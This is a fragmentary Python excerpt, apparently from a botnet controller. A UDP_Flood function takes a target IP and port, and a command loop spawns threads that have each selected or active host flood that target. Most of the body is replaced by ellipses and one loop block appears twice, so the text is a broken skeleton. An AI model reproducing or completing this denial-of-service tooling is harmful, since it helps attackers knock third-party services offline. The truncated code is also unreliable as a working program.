...
def UDP_Flood(target_IP,target_Port,msg,cur_host_con,cur_host_id):
    ...
    if translated == 0:
        ...
        while True:
            ...
            if comm_body == "List_Commands":
                ...
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in list_of_selected_hosts:
                    t = threading.Thread(target=UDP_Flood,args=(targetIP,targetPort,msg,active_hosts[host_at_hand][0],host_at_hand))
                    jobs.append(t)
                for j in jobs:
                    j.start()
                for j in jobs:
        ...
        while True:
            ...
            if comm_body == "List_Commands":
                ...
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in active_hosts:
